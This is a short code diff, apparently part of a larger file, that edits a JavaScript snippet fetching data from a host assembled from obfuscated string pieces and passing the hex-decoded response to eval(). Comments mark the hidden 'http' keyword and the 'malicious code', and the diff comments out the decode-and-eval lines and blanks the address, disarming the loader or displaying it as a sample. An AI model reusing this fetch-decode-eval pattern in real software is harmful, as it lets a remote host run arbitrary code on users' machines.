@@ -26,6 +26,7 @@ var e = Buffer.from(e, "hex").toString()
 var url_part_1 = 'h' + 't' + 't' + 'p' // <--- disguised http keyword
 var url_part_2 = ['api.github', '.com/repos'].join('')
 var getAddress = url_part_1 + url_part_2;
+
 https.get(
 { 
  hostname: getAddress,
@@ -35,11 +36,12 @@ https.get(
   },
  r => {
  r.on("data", c => {
-   c = Buffer.from(c, "hex").toString()
-   eval(c);  // <--- malicious code here
+   // c = Buffer.from(c, "hex").toString()
+   // eval(c);  // <--- malicious code here
    });
   }
 )
+var getAddress = ""
 `
 
 // var url_part_1 = 'h' + 't' + 't' + 'p' // <--- disguised http keyword
